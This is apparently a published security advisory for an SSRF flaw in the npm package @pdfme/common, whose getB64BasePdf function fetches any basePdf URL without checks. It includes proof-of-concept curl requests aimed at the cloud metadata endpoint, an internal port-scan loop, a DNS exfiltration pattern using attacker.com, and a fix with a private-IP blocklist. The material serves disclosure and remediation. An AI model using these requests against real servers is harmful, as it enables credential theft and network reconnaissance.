# [M] PDFME has SSRF via Unvalidated URL Fetch in `getB64BasePdf` When `basePdf` Is Attacker-Controlled

## Summary
Severity: Medium
Advisory: GHSA-pgx6-7jcq-2qff
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-pgx6-7jcq-2qff
Type: github-advisory

## Affected
- npm: `@pdfme/common` — affected >=0 <5.5.10

## Details
## Summary

The `getB64BasePdf` function in `@pdfme/common` fetches arbitrary URLs via `fetch()` without any validation when `basePdf` is a non-data-URI string and `window` is defined. An attacker who can control the `basePdf` field of a template (e.g., through a web application that accepts user-supplied templates) can force the server or client to make requests to arbitrary internal or external endpoints, enabling Server-Side Request Forgery (SSRF) in SSR contexts or blind request forgery in browser contexts.

## Details

The vulnerability exists in `packages/common/src/helper.ts:130-141`. When `getB64BasePdf` receives a string that does not start with `data:application/pdf;`, and `window` is defined, it passes the string directly to `fetch()`:

```typescript
// packages/common/src/helper.ts:130-141
export const getB64BasePdf = async (
  customPdf: ArrayBuffer | Uint8Array | string,
): Promise<string> => {
  if (
    typeof customPdf === 'string' &&
    !customPdf.startsWith('data:application/pdf;') &&
    typeof window !== 'undefined'
  ) {
    const response = await fetch(customPdf);  // <-- No URL validation
    const blob = await response.blob();
    return blob2Base64Pdf(blob);
  }
  // ...
};
```

The Zod schema for `basePdf` in `packages/common/src/schema.ts:133-135` accepts any string:

```typescript
export const CustomPdf = z.union([z.string(), ArrayBufferSchema, Uint8ArraySchema]);
export const BasePdf = z.union([CustomPdf, BlankPdf]);
```

The `checkGenerateProps` function at `packages/common/src/helper.ts:279` only validates the Zod schema shape, which permits any string value. No URL allowlist, protocol restriction, or private IP filtering exists anywhere in the pipeline.

This function is called from multiple entry points:
- `packages/generator/src/helper.ts:42` — during PDF generation
- `packages/ui/src/hooks.ts:67` — during UI rendering
- `packages/ui/src/helper.ts:292` — during template processing

The `typeof window !== 'undefined'` guard is commonly satisfied in SSR environments (Next.js, Nuxt with jsdom, Cloudflare Workers) where `window` is polyfilled but `fetch` has full network access without CORS restrictions.

## PoC

### 1. Setup a vulnerable application

```javascript
// server.js — Next.js API route or Express handler using pdfme
import { generate } from '@pdfme/generator';

export async function POST(req) {
  const { template, inputs } = await req.json();
  // Application accepts user-provided templates
  const pdf = await generate({ template, inputs, plugins: {} });
  return new Response(pdf);
}
```

### 2. Probe internal services via SSRF

```bash
# Attacker sends a template with basePdf pointing to an internal service
curl -X POST http://target-app.com/api/generate-pdf \
  -H 'Content-Type: application/json' \
  -d '{
    "template": {
      "basePdf": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "schemas": [[]]
    },
    "inputs": [{}]
  }'
```

### 3. Port scanning internal network

```bash
# Scan internal hosts by observing response timing differences
for port in 80 443 3306 5432 6379 8080; do
  curl -s -o /dev/null -w "%{time_total}" -X POST http://target-app.com/api/generate-pdf \
    -H 'Content-Type: application/json' \
    -d "{
      \"template\": {
        \"basePdf\": \"http://10.0.0.1:${port}/\",
        \"schemas\": [[]]
      },
      \"inputs\": [{}]
    }"
  echo " - port $port"
done
```

### 4. Exfiltrate cloud metadata (AWS example)

```bash
# In SSR context, fetch reads the full response body and converts to base64
curl -X POST http://target-app.com/api/generate-pdf \
  -H 'Content-Type: application/json' \
  -d '{
    "template": {
      "basePdf": "http://169.254.169.254/latest/meta-data/",
      "schemas": [[]]
    },
    "inputs": [{}]
  }'
# The fetch will succeed; the response will fail PDF parsing,
# but error messages or timing differences leak information
```

## Impact

- **Cloud metadata exfiltration**: In SSR deployments on AWS/GCP/Azure, attackers can reach instance metadata endpoints (`169.254.169.254`) to steal IAM credentials, API tokens, and service account keys.
- **Internal network reconnaissance**: Attackers can probe internal services, discover open ports, and map network topology by observing response timing and error differences.
- **Internal service access**: Requests to internal APIs (databases, caches, admin panels) that are not exposed to the internet but accessible from the server.
- **Blind request forgery in browsers**: Even with CORS restrictions limiting response reading, attackers can trigger state-changing requests to internal services (GET-based actions, webhook triggers).
- **Data exfiltration via DNS**: Attackers can use DNS-based exfiltration by crafting URLs like `http://<stolen-data>.attacker.com` to leak information even when responses are not readable.

## Recommended Fix

Add URL validation in `getB64BasePdf` before calling `fetch()`. At minimum, restrict to HTTPS and block private/reserved IP ranges:

```typescript
// packages/common/src/helper.ts

const BLOCKED_HOSTNAME_PATTERNS = [
  /^localhost$/i,
  /^127\./,
  /^10\./,
  /^172\.(1[6-9]|2\d|3[01])\./,
  /^192\.168\./,
  /^169\.254\./,
  /^0\./,
  /^\[::1\]/,
  /^\[fc/i,
  /^\[fd/i,
  /^\[fe80:/i,
];

function validatePdfUrl(urlString: string): void {
  let parsed: URL;
  try {
    parsed = new URL(urlString);
  } catch {
    throw new Error(`Invalid basePdf URL: ${urlString}`);
  }

  if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
    throw new Error(`basePdf URL must use http or https protocol, got: ${parsed.protocol}`);
  }

  const hostname = parsed.hostname;
  for (const pattern of BLOCKED_HOSTNAME_PATTERNS) {
    if (pattern.test(hostname)) {
      throw new Error(`basePdf URL must not point to private/reserved addresses`);
    }
  }
}

export const getB64BasePdf = async (
  customPdf: ArrayBuffer | Uint8Array | string,
): Promise<string> => {
  if (
    typeof customPdf === 'string' &&
    !customPdf.startsWith('data:application/pdf;') &&
    typeof window !== 'undefined'
  ) {
    validatePdfUrl(customPdf);  // <-- Add validation before fetch
    const response = await fetch(customPdf);
    const blob = await response.blob();
    return blob2Base64Pdf(blob);
  }
  // ...
};
```

Additionally, consider documenting the security implications of passing user-controlled data as `basePdf` and providing an option for applications to supply their own URL validator or allowlist.

## References
- https://github.com/pdfme/pdfme/security/advisories/GHSA-pgx6-7jcq-2qff
- https://github.com/pdfme/pdfme
